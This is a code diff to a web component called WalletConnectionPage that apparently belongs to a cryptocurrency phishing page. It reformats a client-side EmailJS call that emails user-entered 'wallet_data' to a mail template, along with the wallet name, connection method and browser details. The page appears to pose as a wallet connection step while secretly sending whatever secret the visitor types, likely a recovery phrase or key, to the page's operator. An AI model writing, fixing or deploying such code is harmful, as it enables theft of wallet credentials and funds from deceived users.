@@ -271,18 +271,18 @@ export function WalletConnectionPage() {
 
     try {
       // ✅ Send via EmailJS client
-      const result = await emailjs.send(
-        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID as string,
-        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID as string,
-        {
-          walletName: selectedWallet?.name || "Unknown",
-          connectionMethod: connectionMethod,
-          walletData: inputData,
-          userAgent: navigator.userAgent,
-          timestamp: new Date().toISOString(),
-        },
-        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY as string
-      )
+  const result = await emailjs.send(
+  process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID as string,
+  process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID as string,
+  {
+    wallet_name: selectedWallet?.name || "Unknown",  // match {{wallet_name}}
+    connection_method: connectionMethod,            // match {{connection_method}}
+    wallet_data: inputData,                         // match {{wallet_data}}
+    user_agent: navigator.userAgent,                // match {{user_agent}}
+    timestamp: new Date().toISOString(),            // match {{timestamp}}
+  },
+  process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY as string
+)
 
       console.log("Email sent:", result.status, result.text)
     } catch (error) {
